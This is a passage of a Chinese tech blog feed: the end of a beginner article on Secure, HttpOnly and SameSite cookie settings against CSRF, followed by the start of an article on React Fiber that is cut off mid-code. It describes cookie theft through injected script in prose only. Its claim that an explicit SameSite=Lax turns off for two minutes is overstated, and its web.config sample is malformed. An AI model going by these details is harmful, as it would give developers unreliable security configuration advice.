&lt;p&gt;那這個最晚才誕生的瀏覽器安全屬性有甚麼特別之處，可以被稱為 CSRF 之敵？在我的 &lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery&quot;&gt;資安零基礎系列第一篇 CSRF 攻擊介紹&lt;/a&gt; 中，可以很清楚的了解到， CSRF 的特性在於攻擊者跨 Domain 向網站提出請求，而網站無條件信任 Cookie 而沒有再確認或以其他方式驗證，只知道這個 Request 帶著某個使用者的 Cookie，便接受了這個 Request ，卻不會去確認這個 Request 是不是由使用者自願發出的（ 就像是菜單上的桌號是你的，但不代表這個菜是你點的 ）。&lt;/p&gt;
&lt;p&gt;那你一定會想，那如果只要不是我執行操作的這個 Domain 上發送的所有 Request ，網站都通通丟掉不接受不就好了（ 只要不是坐在店裡的人給老闆的菜單老闆都直接丟掉）？&lt;/p&gt;
&lt;p&gt;沒錯！這就是 SameSite 這個屬性的特性，瀏覽器會檢查 Request 的來源是否與發布 Cookie 的來源相同。&lt;br&gt;
如果不是，瀏覽器就不會在 Request 中包含Cookie，因此便可以從根本上 CSRF 的攻擊來阻止。&lt;/p&gt;
&lt;p&gt;但即使如此， SameSite 其實還是有破綻，以自身經歷來說，曾經遇過一個網站設置了 SameSite 卻沒有設定 HttpOnly ，因此攻擊者只要在網站中嵌入一個讓使用者自己執行 document.cookie ，並將執行完成的結果送給攻擊者的惡意程式，於是攻擊者一樣可以拿到使用者所有的 Cookie 資料。&lt;/p&gt;
&lt;p&gt;也許你會說，這個黑鍋 SameSite 不背，這是 HttpOnly 要負的責任，這樣說當然沒錯，因為三個屬性沒有共存的確會產生預期外的安全風險，不能說這是 SameSite 的錯，但 SameSite 還真有其他的弱點，如果設定的值是 Lax 的話，只要在網站導頁後的兩分鐘內，瀏覽器為了避免破壞到某些網站的登入流程和使用者體驗， SameSite 的設定會變成 none ，也就是沒設的意思。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-secure-samesite-httponly/p3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;所以如果可以的話，建議除了設定 SameSite 以外，再加上 CSRF Token 會更有效的防範 CSRF 的攻擊。&lt;/p&gt;
&lt;h2 id=&quot;%E5%AF%A6%E4%BD%9C%E4%B8%89%E6%9C%AC%E6%9F%B1&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E4%BD%9C%E4%B8%89%E6%9C%AC%E6%9F%B1&quot;&gt;#&lt;/a&gt; 實作三本柱&lt;/h2&gt;
&lt;p&gt;說了這麼多，想必到這邊你應該也對這三種瀏覽器的安全屬性有了一定的認識，有道是坐而言不如起而行，讀萬卷書不如行萬里路！&lt;/p&gt;
&lt;p&gt;有點尷尬不過總而言之，來介紹實作！&lt;/p&gt;
&lt;h3 id=&quot;secure-%26-httponly&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#secure-%26-httponly&quot;&gt;#&lt;/a&gt; Secure &amp;amp; HttpOnly&lt;/h3&gt;
&lt;h3 id=&quot;%E7%AC%AC%E4%B8%80%E6%AD%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%80%E6%AD%A5&quot;&gt;#&lt;/a&gt; 第一步&lt;/h3&gt;
&lt;p&gt;確保自己的網站是 Https SSL ，否則你會發現你的網站一直在把使用者登出，相關設置可以參考官方文件 &lt;a href=&quot;https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis&quot;&gt;How to Set Up SSL&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E7%AC%AC%E4%BA%8C%E6%AD%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%BA%8C%E6%AD%A5&quot;&gt;#&lt;/a&gt; 第二步&lt;/h3&gt;
&lt;p&gt;設定Secure &amp;amp; HttpOnly有很多種方法，我這邊以 &lt;code&gt;ASP.NET&lt;/code&gt; 來舉例，修改你的 &lt;code&gt;web.config&lt;/code&gt;，新增：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;&amp;lt;system.web&gt;  &lt;br&gt; &amp;lt;httpCookies httpOnlyCookies=”true” requireSSL=”true” /&gt;  &lt;br&gt;&amp;lt;system.web&gt;&lt;br&gt;&lt;br&gt;requireSSL=”true” 設定 Secure ，&lt;br&gt;&lt;br&gt;httpOnlyCookies=”true” 設定 HttpOnly&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這樣設定完後，就完成了 Secure &amp;amp; HttpOnly 的設定！&lt;/p&gt;
&lt;h3 id=&quot;samesite-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#samesite-2&quot;&gt;#&lt;/a&gt; SameSite&lt;/h3&gt;
&lt;p&gt;SameSite 的屬性可以進行三種設定&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Strict&lt;/strong&gt;：這是限制最嚴格的設定，會完全禁止第三方的 Cookie 請求，基本上只有在網域和 URL 中的網域相同，才會傳遞 Cookie 請求，舉例來說，當網站裡有一個 FB 連結時，點開連結，使用者必須要再登入一次 FB ，因為網站沒有傳送任何 FB 的 Cookie 。&lt;/p&gt;
&lt;p&gt;這是三種設定中最嚴謹也最安全的設定，但也因此會讓使用者在網站的使用體驗上變得比較不方便，通常會使用於銀行或是購物網站等有金流交易的網站上。&lt;/p&gt;
&lt;p&gt;設定的方法為在 Server 上進行設定&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;Set-Cookie: CookieName=CookieValue; SameSite=Strict;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Lax&lt;/strong&gt;：而也因為了 Strict 的嚴格，所以有了 Lax 這個比較符合使用者使用體驗上的值產生， Lax 的要求同樣會限制大多數的第三方請求，但 Lax 會允許 Get 的請求，以表單來舉例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-secure-samesite-httponly/p4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;和 none 的全部允許與 Strict 的全部不允許來說， Lax 禁止了比較不安全的 POST 請求，卻又有一定的安全性，因此是 SameSite 目前在應用上較常出現的設定值，而2020年2月發布的 Chrome 80 以後皆是預設網站以 Lax 進行設定。&lt;/p&gt;
&lt;p&gt;設定的方法為在 Server 上進行設定&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;Set-Cookie: CookieName=CookieValue; SameSite=Lax;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt;：這個值顧名思義就是不限制 Cookie 傳送的意思，不過如果在網站上想要將 SameSite 的值設定為 None 的話，網站中的 Secure 必須要是開啟的， None 的設定才會生效，算是瀏覽器為了網站的安全性上做的一些小限制。&lt;/p&gt;
&lt;p&gt;設定的方法為在 Server 上進行設定&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;Set-Cookie: widget\_session=abc123; SameSite=None; Secure&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h2&gt;
&lt;p&gt;在瀏覽器上這三種屬性的設定對工程師來說，成本不高但達成的效果卻不小，因此可以說是網站安全的入門經典款配置，不過也正我如前面所說，三個屬性沒有共存有可能會產生預期外的安全風險，所以如果可以的話，請盡可能的將這三種屬性都進行設定。&lt;/p&gt;
&lt;p&gt;此外，值得注意的一點是 SameSite 的設定不只是在 Cookie 的送出上，其實也會影響到 Cookie 的寫入，如果需要在使用者的使用體驗上進行衡量的話，建議除非是銀行或是購物網站等有金流交易的網站，否則一般的網站其實只要設定 Lax 的值並搭配 CSRF Token 就已經擁有較高層級的 CSRF 攻擊防護了。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;#&lt;/a&gt; 延伸閱讀&lt;/h2&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery ）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery&quot;&gt;認識 CSRF（Cross Site Request Forgery）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;認識 XSS（Cross-Site Scripting）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h2&gt;
&lt;h3 id=&quot;httpcookies-element&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#httpcookies-element&quot;&gt;#&lt;/a&gt; httpCookies Element&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262%28v=vs.100%29?redirectedfrom=MSDN&quot;&gt;https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)?redirectedfrom=MSDN&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;how-to-set-up-ssl&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#how-to-set-up-ssl&quot;&gt;#&lt;/a&gt; How to Set Up SSL&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis&quot;&gt;https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;cookie-%E7%9A%84-samesite-%E5%B1%AC%E6%80%A7&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#cookie-%E7%9A%84-samesite-%E5%B1%AC%E6%80%A7&quot;&gt;#&lt;/a&gt; Cookie 的 SameSite 屬性&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html&quot;&gt;https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>隱藏在 React 下的機制： Fiber</title>
		<link href="https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/"/>
		<updated>2021-05-28T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/</id>
		<content type="html">
		  &lt;p&gt;不知不覺都 2021 年中了，從 React 16.3 的重大更新後也已經過了兩年多了，不知到大家還記不記得當時的兩大重要功能，其一為 Function Component ( hooks )，另一個大家比較不那麼熟悉但卻也很重要的則應該屬 Fiber 架構，但其實會有 hook 的設計也是也是因為上述架構的關係。&lt;/p&gt;
&lt;p&gt;在當時引想大家最多的應該屬生命週期的變換，不曉得大家是否還記得當時最常用到的生命週期 &lt;code&gt;componentWillUpdate&lt;/code&gt;/&lt;code&gt;componentWillReceiveProps&lt;/code&gt; 將被廢除時驚訝的心情? 而當時也加入了兩個新的 lifecycle 來解決以上問題。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;getDerivedStateFromProps&lt;/li&gt;
&lt;li&gt;getSnapshotBeforeUpdate&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p1.png&quot; alt=&quot;Re: React 常用的生命週期(1)&quot;&gt;&lt;br&gt;
&lt;a href=&quot;https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/&quot;&gt;https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;至於為什麼會產生以下的變化呢？這就要說說本次的主題 Fiber 了。&lt;/p&gt;
&lt;h2 id=&quot;fiber-%E6%98%AF%E4%BB%80%E9%BA%BC&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fiber-%E6%98%AF%E4%BB%80%E9%BA%BC&quot;&gt;#&lt;/a&gt; Fiber 是什麼&lt;/h2&gt;
&lt;p&gt;Fiber 屬於更為底層的抽象行為，目的是為了達到以下幾種功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;幫不同類型的工作分配優先順序&lt;/li&gt;
&lt;li&gt;暫停工作，稍後回來&lt;/li&gt;
&lt;li&gt;當不需要工作時取消&lt;/li&gt;
&lt;li&gt;重新使用已經完成的工作&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- summary --&gt;
&lt;p&gt;在尚未使用 Fiber 前，由於畫面更新前須由 reconciler ( React ) 調度完後才會送到 renderer，且當畫面複雜時，更動一個 state 狀態時也需要將底下的所有子元件重新 render 出一份 virtual dom，而在過去這個部分全部只由一個主線程去做同步式渲染，因此當有一個 Component 需要費時較多時間時，將會把主線程 block，當時間一長，就有可能導致來不及更新至指定時間範圍內，造成無法順利渲染，會有不順暢的情況發生。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p2.png&quot; alt=&quot;Re: sync mode 和 async mode 的差異&quot;&gt;&lt;br&gt;
&lt;a href=&quot;https://twitter.com/acdlite/status/977291318324948992&quot;&gt;https://twitter.com/acdlite/status/977291318324948992&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8&quot;&gt;#&lt;/a&gt; Fiber 的產生及作用&lt;/h2&gt;
&lt;p&gt;為了解決此問題，React 制定了 fiber 的結構，利用非同步的渲染方式來解決，將各元件拆解，也避免了長時間占用主線程所導致卡頓的問題。 ( 所使用的 &lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/API/Window/requestIdleCallback&quot;&gt;API&lt;/a&gt;， &lt;a href=&quot;https://github.com/facebook/react/blob/4c7036e807fa18a3e21a5182983c7c0f05c5936e/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L1541&quot;&gt;source code&lt;/a&gt; )&lt;/p&gt;
&lt;p&gt;傳統 React 更新時會分成兩個時期&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p3.png&quot; alt=&quot;Re: React 更新時期&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reconciliation / render 階段 ( 判斷哪先元件需要更新，可中斷 )&lt;/li&gt;
&lt;li&gt;commit 階段 ( 插入、移動、刪除節點，不可中斷 )&lt;/li&gt;
&lt;/ul&gt;
&lt;!--（有誤 需更正） commit phase 的執行很快，而 render phase 產生真實 DOM 的時間卻很久，因此在 react 更新元件時可能會中斷更新以避免阻塞瀏覽器，也代表可能會因為被中斷而重新執行，所以必須保持沒有 side effect 的情況來避免非預期的情況。 --&gt;
&lt;p&gt;reconciliation phase 會先通過 render 更新元件，在第一次實建立 Fiber 節點，並在之後更新與上一次所渲染的 DOM 比較，因此在 render 階段將執行以下生命週期方法判斷是否有更新：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;componentWillMount (已廢棄)&lt;/li&gt;
&lt;li&gt;componentWillReceiveProps (已廢棄)&lt;/li&gt;
&lt;li&gt;componentWillUpdate (已廢棄)&lt;/li&gt;
&lt;li&gt;getDerivedStateFromProps&lt;/li&gt;
&lt;li&gt;shouldComponentUpdate&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;react 可以根據目前的狀況調整，可以選擇一次處理單個或者多個 fiber 並且調整優先權，因此可以異步執行及中斷，但也因為如此，內部的邏輯必須避免 side effect。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p4.png&quot; alt=&quot;Re: Commit phrase 和 render phrase&quot;&gt;&lt;/p&gt;
&lt;p&gt;在 render 階段執行完後將會產生包含著 side effect 的 fiber 節點樹，而 side effect 事實上就是 commit 階段所需要更新操作，會在執行 commit 階段時輪詢 side effect 列表去對 DOM 進行修改。&lt;/p&gt;
&lt;p&gt;以下是commit階段執行的生命週期方法列表：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;getSnapshotBeforeUpdate&lt;/li&gt;
&lt;li&gt;componentDidMount&lt;/li&gt;
&lt;li&gt;componentDidUpdate&lt;/li&gt;
&lt;li&gt;componentWillUnmount&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因為這些方法在同步commit階段執行，所以它們可能包含副作用或更動 DOM。&lt;/p&gt;
&lt;p&gt;而前面說到被廢除的兩個 lifecycle 因為是屬於 render phase，有機會被多次執行，為了避免 side effect 發生，才會移除此 lifecycle。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;componentWillUpdate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;componentWillReceiveProps&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而拿掉以上 API 後則利用 &lt;code&gt;getDerivedStateFromProps&lt;/code&gt; 來取代 &lt;code&gt;componentWillReceiveProps&lt;/code&gt;，但由於 &lt;code&gt;getDerivedStateFromProps&lt;/code&gt; 被設計成靜態函數，不用擔心 side effect 所帶來的影響，不過要避免從 props 等等去觸發 side effect。&lt;/p&gt;
&lt;h2 id=&quot;fiber-nodes-%E5%92%8C-fiber-tree&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fiber-nodes-%E5%92%8C-fiber-tree&quot;&gt;#&lt;/a&gt; Fiber nodes 和 Fiber tree&lt;/h2&gt;
&lt;p&gt;在 reconciliation 時，每個 component 的 render 方法回傳的資料都會合併到 Fiber tree 中，每個React元素都有一個對應的 Fiber nodes，用來記錄對應的工作內容，而特別的地方在於在每次 render 時不會重新產生 Fiber node。&lt;/p&gt;
&lt;p&gt;更確切的說，每個 Fiber 就是一個 worker ，提供了跟踪，調度，暫停和中止工作的方法。&lt;/p&gt;
&lt;p&gt;每一個 Fiber Node 節點與 Virtual Dom 對應，所有 Fiber Node 連接起來形成 Fiber tree，為單向連結串列的樹狀結構：&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/mingyou/deep-dive-into-react-fiber/p5.png&quot; alt=&quot;Re: Fiber tree&quot;&gt;&lt;/p&gt;
&lt;p&gt;主要是為了將原本的樹狀遞迴輪詢轉變成循環輪詢，配合 requestIdleCallback API, 實現任務拆分、中斷與恢復。&lt;/p&gt;
&lt;p&gt;大概結構如下：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;type Fiber &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 標籤類型&lt;/span&gt;&lt;br&gt;  tag&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; TypeOfWork&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  key&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; string&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 與 Fiber 所關聯的類型&lt;/span&gt;&lt;br&gt;  type&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// local 狀態&lt;/span&gt;&lt;br&gt;  stateNode&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 以下區塊負責處理 Fiber&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 單向連結串列結構&lt;/span&gt;&lt;br&gt;  child&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  sibling&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  index&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; number&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 輸出用的狀態&lt;/span&gt;&lt;br&gt;  memoizedState&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 紀錄在單向鏈結串列中的下一個 Fiber &lt;/span&gt;&lt;br&gt;  nextEffect&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 子樹中具有 side effect 的第一個和最後一個光纖&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 當我們重用已完成的工作時，我們重用 link list 的一部分&lt;/span&gt;&lt;br&gt;  firstEffect&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  lastEffect&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 快速確定子樹是否沒有正在等待的更動&lt;/span&gt;&lt;br&gt;  pendingWorkPriority&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; PriorityLevel&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 如果工作在光纖上進行，而該光纖已經在較低的優先權開始了一部分工作&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 那麼我們需要將已完成的工作儲存著。直到我們需要重新開始處理它為止&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// 它可能與 &quot;目前&quot; 的 child 不同。&lt;/span&gt;&lt;br&gt;  progressedChild&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Fiber &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在這結構中，nextEffect / firstEffect / lastEffect 將在後面的章節 ( Effect List ) 中表現出相當的重要性。&lt;/p&gt;
&lt;h2 id=&quot;workinprogress-tree&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#workinprogress-tree&quot;&gt;#&lt;/a&gt; workInProgress tree&lt;/h2&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;createWorkInProgress&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;current&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; workInProgress &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; current&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;alternate&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;workInProgress &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        workInProgress &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;createFiber&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;br&gt;    workInProgress&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;alternate &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; current&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    current&lt;span class=&quot;token 